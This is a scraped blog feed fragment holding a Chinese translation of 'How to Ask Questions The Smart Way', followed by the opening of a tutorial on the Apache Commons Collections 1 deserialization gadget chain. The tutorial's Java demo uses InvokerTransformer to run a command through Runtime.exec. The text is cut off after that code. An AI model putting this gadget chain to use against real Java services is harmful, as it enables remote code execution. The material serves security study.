也许可以这样做，但你不行）。\n更白话的说，如果你写得像是个半文盲[译注：小白]，那多半得不到理睬。也不要使用即时通信中的简写或火星文，如将的简化为d会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。\n如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂的语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚未被阅读就被直接删除的可能性降到最低。\n如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的： [译注：以下附上原文以供使用]\nEnglish is not my native language; please excuse typing errors.\n英文不是我的母语，请原谅我的错字或语法。 If you speak $LANGUAGE, please email/PM me; I may need assistance translating my question.\n如果你说某语言，请向我发电邮/私信； 我需要有人协助我翻译我的问题。 I am familiar with the technical terms, but some slang expressions and idioms are difficult for me.\n我对技术名词很熟悉，但对于俗语或是特别用法不甚了解。 I\u0026rsquo;ve posted my question in $LANGUAGE and English. I\u0026rsquo;ll be glad to translate responses, if you only use one or the other.\n我把我的问题用某语言和英文写出来。 如果你只用其中的一种语言回答，我会乐意将回复翻译成为你使用的语言。 使用易于读取且标准的文件格式发送问题 如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：\n使用纯文字而不是 HTML (关闭 HTML 并不难）。 使用 MIME 附件通常是可以的，前提是真正有内容（譬如附带的源代码或 patch），而不仅仅是邮件程序生成的模板（譬如只是信件内容的拷贝）。 不要发送一段文字只是一行句子但自动换行后会变成多行的邮件（这使得回复部分内容非常困难）。设想你的读者是在 80 个字符宽的终端机上阅读邮件，最好设置你的换行分割点小于 80 字。 但是，对一些特殊的文件不要设置固定宽度（譬如日志文件拷贝或会话记录）。数据应该原样包含，让回复者有信心他们看到的是和你看到的一样的东西。 在英语论坛中，不要使用Quoted-Printable MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持这种编码。当它们处理换行时，那些文本中四处散布的=20符号既难看也分散注意力，甚至有可能破坏内容的语意。 绝对，永远不要指望黑客们阅读使用封闭格式编写的文档，像微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你家门口时你的反应一样。即便他们能够处理，他们也很厌恶这么做。 如果你从使用 Windows 的电脑发送电子邮件，关闭微软愚蠢的智能引号功能 （从[选项] \u0026gt; [校订] \u0026gt; [自动校正选项]，勾选掉智能引号单选框），以免在你的邮件中到处散布垃圾字符。 在论坛，勿滥用表情符号和HTML功能（当它们提供时）。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是对答案感兴趣。 如果你使用图形用户界面的邮件程序（如微软公司的 Outlook 或者其它类似的），注意它们的默认设置不一定满足这些要求。大多数这类程序有基于选单的查看源代码命令，用它来检查发送文件夹中的邮件，以确保发送的是纯文本文件同时没有一些奇怪的字符。\n精确地描述问题并言之有物 仔细、清楚地描述你的问题或 Bug 的症状。 描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：Fedora Core 4、Slackware 9.1等）。 描述在提问前你是怎样去研究和理解这个问题的。 描述在提问前为确定问题而采取的诊断步骤。 描述最近做过什么可能相关的硬件或软件变更。 尽可能地提供一个可以重现这个问题的可控环境的方法。 尽量去揣测一个黑客会怎样反问你，在你提问之前预先将黑客们可能提出的问题回答一遍。\n以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。\nSimon Tatham 写过一篇名为《如何有效地报告Bug》的出色文章。强力推荐你也读一读。\n话不在多而在精 你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。\n这样做的用处至少有三点。 第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加； 第二，简化问题使你更有可能得到有用的答案； 第三，在精炼你的 bug 报告的过程中，你很可能就自己找到了解决方法或权宜之计。\n别动辄声称找到 Bug 当你在使用软件中遇到问题，除非你非常、非常的有根据，不要动辄声称找到了 Bug。提示：除非你能提供解决问题的源代码补丁，或者提供回归测试来表明前一版本中行为不正确，否则你都多半不够完全确信。这同样适用在网页和文件，如果你（声称）发现了文件的Bug，你应该能提供相应位置的修正或替代文件。\n请记得，还有其他许多用户没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前已经做了这些，是吧？）。这也意味着很有可能是你弄错了而不是软件本身有问题。\n编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了 Bug，也就是在质疑他们的能力，即使你是对的，也有可能会冒犯到其中某部分人。当你在标题中嚷嚷着有Bug时，这尤其严重。\n提问时，即使你私下非常确信已经发现一个真正的 Bug，最好写得像是你做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有 Bug，维护者就会向你道歉，这总比你惹恼别人然后欠别人一个道歉要好一点。\n低声下气不能代替你的功课 有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 —— 低声下气：我知道我只是个可悲的新手，一个失败者，但...。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。\n别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。\n有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。\n描述问题症状而非你的猜测 告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。\n蠢问题\n我在编译内核时接连遇到 SIG11 错误， 我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？\n聪明问题\n我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组）， 256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误， 但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。 所有内存都换过了，没有效果。相关部分的标准编译记录如下…\n由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：所有的诊断专家都来自密苏里州。 美国国务院的官方座右铭则是：让我看看（出自国会议员 Willard D. Vandiver 在 1899 年时的讲话：我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方地展示给我们看吧！\n按发生时间先后列出问题症状 问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。\n如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住，多不等于好。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。\n如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样黑客们在读你的记录时就知道该注意哪些内容了。\n描述目标而不是过程 如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。\n经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。\n蠢问题\n我怎样才能从某绘图程序的颜色选择器中取得十六进制的 RGB 值？\n聪明问题\n我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot）， 但却无法从某绘图程序的颜色选择器取得十六进制的 RGB 值。\n第二种提问法比较聪明，你可能得到像是建议采用另一个更合适的工具的回复。\n别要求使用私人电邮回复 黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。\n当你要求私下回复时，这个过程和奖励都被中止。别这样做，让回复者来决定是否私下回答 —— 如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于不可能使其他人产生兴趣。\n这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句会是向我发电邮，我将为论坛归纳这些回复。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来是非常有礼貌的 —— 但你必须信守诺言。\n清楚明确地表达你的问题以及需求 漫无边际的提问是近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫无边际的提问。\n如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么做很棒。\n要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。\n所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你获得有用的答案相当有帮助 —— 但这技巧通常和简化问题有所区别。因此，问我想更好地理解 X，可否指点一下哪有好一点说明？通常比问你能解释一下 X 吗？更好。如果你的代码不能运作，通常请别人看看哪里有问题，比要求别人替你改正要明智得多。\n询问有关代码的问题时 如果没有提示别人应该从何入手，别要求他人帮你调试有问题的代码。张贴几百行的代码，然后说一声：它不能工作会让你完全被忽略。只贴几十行代码，然后说一句：在第七行以后，我期待它显示 \u0026lt;x\u0026gt;，但实际出现的是 \u0026lt;y\u0026gt;比较有可能让你得到回应。\n最有效描述程序问题的方法是提供最精简的 Bug 展示测试用例（bug-demonstrating test case）。什么是最精简的测试用例？那是问题的缩影；一小个程序片段能刚好展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试用例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译/直译/被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试用例越小越好（查看话不在多而在精一节）。\n一般而言，要得到一段相当精简的测试用例并不太容易，但永远先尝试这样做是一个好习惯。这种方式可以帮助你了解如何自行解决这个问题 —— 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。\n如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。\n别把自己家庭作业的问题贴上来 黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由你来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。\n如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在用户群组，论坛或（最后一招）在项目的用户邮件列表或论坛中提问。尽管黑客们会看出来，但一些有经验的用户也许仍会给你一些提示。\n去掉无意义的提问句 避免用无意义的话结束提问，例如有人能帮我吗？或者这有答案吗？。\n首先：如果你对问题的描述不是很好，这样问更是画蛇添足。\n其次：由于这样问是画蛇添足，黑客们会很厌烦你 —— 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：没错，有人能帮你或者不，没答案。\n一般来说，避免用 是或否、对或错、有或没有类型的问句，除非你想得到是或否类型的回答。\n即使你很急也不要在标题写紧急 这是你的问题，不是我们的。宣称紧急极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即时引起关注的问题。更严重的是，紧急这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器过滤掉 —— 你希望能看到你问题的人可能永远也看不到。\n有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。\n当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实上，张贴诸如紧急：帮我救救这个毛茸茸的小海豹！肯定让你被黑客忽略或惹恼他们，即使他们认为毛茸茸的小海豹很重要。\n如果你觉得这点很不可思议，最好再把这份指南剩下的内容多读几遍，直到你弄懂了再发文。\n礼多人不怪，而且有时还很有帮助 彬彬有礼，多用请和谢谢您的关注，或谢谢你的关照。让大家都知道你对他们花时间免费提供帮助心存感激。\n坦白说，这一点并没有比使用清晰、正确、精准且合乎语法和避免使用专用格式重要（也不能取而代之）。黑客们一般宁可读有点唐突但技术上鲜明的 Bug 报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教给我们什么来评价问题的价值的）\n然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。\n（我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一条。一些黑客觉得先谢了意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说先谢了，然后事后再对回复者表示感谢，或者换种方式表达感激，譬如用谢谢你的关注或谢谢你的关照。）\n问题解决后，加个简短的补充说明 问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。\n最理想的方式是向最初提问的话题回复此消息，并在标题中包含已修正，已解决或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串问题 X和问题 X - 已解决的潜在回复者就明白不用再浪费时间了（除非他个人觉得问题 X有趣），因此可以利用此时间去解决其它问题。\n补充说明不必很长或是很深入；简单的一句你好，原来是网线出了问题！谢谢大家 – Bill比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。\n对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题，在此之后才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。\n除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表/新闻群组/论坛中搜索到真正解决你问题的方案，让他们也从中受益。\n至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。\n思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。\n在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。\n如何解读答案 RTFM 和 STFW：如何知道你已完全搞砸了 有一个古老而神圣的传统：如果你收到RTFM（Read The Fucking Manual）的回应，回答者认为你应该去读他妈的手册。当然，基本上他是对的，你应该去读一读。\nRTFM 有一个年轻的亲戚。如果你收到STFW（Search The Fucking Web）的回应，回答者认为你应该到他妈的网上搜索。那人多半也是对的，去搜索一下吧。（更温和一点的说法是 Google 是你的朋友！）\n在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。\n通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为：\n你需要的信息非常容易获得； 你自己去搜索这些信息比灌给你，能让你学到更多。 你不应该因此不爽；依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见。你应该对他祖母般的慈祥表示感谢。\n如果还是搞不懂 如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了点什么。\n比方说，如果我回答你：看来似乎是 zentry 卡住了；你应该先清除它。，然后，这是一个很糟的后续问题回应：zentry 是什么？ 好的问法应该是这样：哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？\n处理无礼的回应 很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直截了当，一针见血式的交流风格，这种风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。\n如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的前辈多半会招呼他。如果这没有发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而你将被视为有错的一方，这将伤害到你获取信息或帮助的机会。\n另一方面，你偶尔真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。\n（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会正常交往所需的神经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们喜欢我们现在这个样子，并且通常对病患标记都有站得住脚的怀疑。）\nJeff Bigler 的观察总结和这个相关也值得一读 (tact filters)。\n在下一节，我们会谈到另一个问题，当你行为不当时所会受到的冒犯。\n如何避免扮演失败者 在黑客社区的论坛中，你以本指南所描述的或类似的方式，可能会有那么几次搞砸了。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。\n这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被言语攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、不去关马桶盖等等。相反地，你该这么做：\n熬过去，这很正常。事实上，它是有益健康且合理的。\n社区的标准不会自行维持，它们是通过参与者积极而公开地执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。\n也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称如果你不想帮助用户就闭嘴。 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的唠叨与无用的技术论坛。\n夸张的讲法是：你要的是“友善”（以上述方式）还是有用？两个里面挑一个。\n记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心你和他的社区而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现得有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像对待脆弱的洋娃娃那样对你。\n有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是真的会把问题搞砸。\n这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这点你不用操心。\n也别让自己卷入口水战，最好不要理睬大多数的口水战 —— 当然，这是在你检验它们只是口水战，并且未指出你有搞砸的地方，同时也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。\n不该问的问题 以下是几个经典蠢问题，以及黑客没回答时心中所想的：\n问题：我能在哪找到 X 程序或 X 资源？\n问题：我怎样用 X 做 Y？\n问题：如何设定我的 shell 提示？\n问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？\n问题：我的程序/设定/SQL 语句没有用\n问题：我的 Windows 电脑有问题，你能帮我吗？\n问题：我的程序不会动了，我认为系统工具 X 有问题\n问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？\n问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？\n问题：我能在哪找到 X 程序或 X 资源？\n回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 Google 吗？\n问题：我怎样用 X 做 Y？\n回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。\n问题：如何设定我的 shell 提示？？\n回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 RTFM，然后自己去找出来。\n问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？\n回答：试试看就知道了。如果你试过，你就知道了答案，就不用浪费我的时间了。\n问题：我的{程序/设定/SQL 语句}没有用\n回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种\n你还有什么要补充的吗？ 真糟糕，希望你能搞定。 这关我屁事？ 问题：我的 Windows 电脑有问题，你能帮我吗？\n回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。\n注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你可以问与 Windows 相关的问题，只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。\n问题：我的程序不会动了，我认为系统工具 X 有问题\n回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库文件有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。\n问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？\n回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在这儿找到用户群组的清单）。\n注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地用户群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 Linux 和所有被怀疑的硬件作关键词仔细搜索。\n问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？\n回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！\n好问题与蠢问题 最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。\n蠢问题：\n我可以在哪儿找到关于 Foonly Flurbamatic 的资料？\n这种问法无非想得到 STFW 这样的回答。\n聪明问题：\n我用 Google 搜索过 \u0026ldquo;Foonly Flurbamatic 2600\u0026rdquo;，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？\n这个问题已经 STFW 过了，看起来他真的遇到了麻烦。\n蠢问题：\n我从 foo 项目找来的源码没法编译。它怎么这么烂？\n他觉得都是别人的错，这个傲慢自大的提问者。\n聪明问题：\nfoo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？\n提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。\n蠢问题：\n我的主机板有问题了，谁来帮我？\n某黑客对这类问题的回答通常是：好的，还要帮你拍拍背和换尿布吗？，然后按下删除键。\n聪明问题：\n我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？\n这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。\n在最后一个问题中，注意告诉我答案和给我启示，指出我还应该做什么诊断工作之间微妙而又重要的区别。\n事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。\n通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他们再浪费时间，我也表明了对他们宝贵时间的尊重。\n事后，当我向每个人表示感谢，并且赞赏这次良好的讨论经历的时候，一个 Linux 内核邮件列表的成员表示，他觉得我的问题得到解决并非由于我是这个列表中的名人，而是因为我用了正确的方式来提问。\n黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我像个乞讨者那样提问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出现。\n如果得不到回答 如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。\n总的来说，简单地重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。\n你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。\n有许多网上的以及本地的用户群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。\n另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了 —— 完全可能如此 —— 你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。\n对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名用户。根本不可能由一个人来处理来自上万名用户的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开源软件的要高得多，且内容也没那么丰富）。\n如何更好地回答问题 态度和善一点。 问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。\n对初犯者私下回复。 对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。\n如果你不确定，一定要说出来！ 一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。\n如果帮不了忙，也别妨碍他。 不要在实际步骤上开玩笑，那样也许会毁了提问者的设置 —— 有些可怜的呆瓜会把它当成真的指令。\n试探性的反问以引出更多的细节。 如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。\n尽管对那些懒虫抱怨一声 RTFM 是正当的，但能给出文档的链接（即使只是建议个 Google 搜索关键词）会更好。\n如果你决定回答，就请给出好的答案。 当别人正在用错误的工具或方法时别建议笨拙的权宜之计（workaround），应推荐更好的工具，重新界定问题。\n正面地回答问题！ 如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 试试看 A 或是 B 或者 试试 X 、 Y 、 Z 、 A 、 B 、 C 并附上一个链接一点用都没有。\n帮助你的社区从问题中学习。 当回复一个好问题时，问问自己如何修改相关文件或常见问题文件以免再次解答同样的问题？，接着再向文件维护者发一份补丁。\n如果你在研究一番后才作出了回答，展现你的技巧而不是直接端出结果。毕竟授人以鱼不如授人以渔。\n相关资源 如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅 Unix 系统和网络基本原理。\n当你发布软件或补丁时，试着按软件发布实践操作。\n鸣谢 Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写如何更好地回答问题这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。\n","date":"2024-07-27T01:19:29+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240727012057978.png","permalink":"https://d4n-sec.github.io/p/how2ask/","title":"How to Ask Questions The Smart Way"},{"content":"假设读者已经掌握（笔者博客里的前置文章内涉及技术的）基础知识\n本文章目的是分析CC链之1 Demo，以及补充相关前置知识，并尝试解决CC1链必要性问题，即CC1的必要路径和可选路径\n笔者的思维路径为深度优先为主，广度为辅的Mindset，如果理解相关知识点，可跳过某些小章节以提升阅读效率。\nCC链1 Demo 简易例子 首先来一个佬的最简化CC链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class CommonC1dm { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } 其中没见过 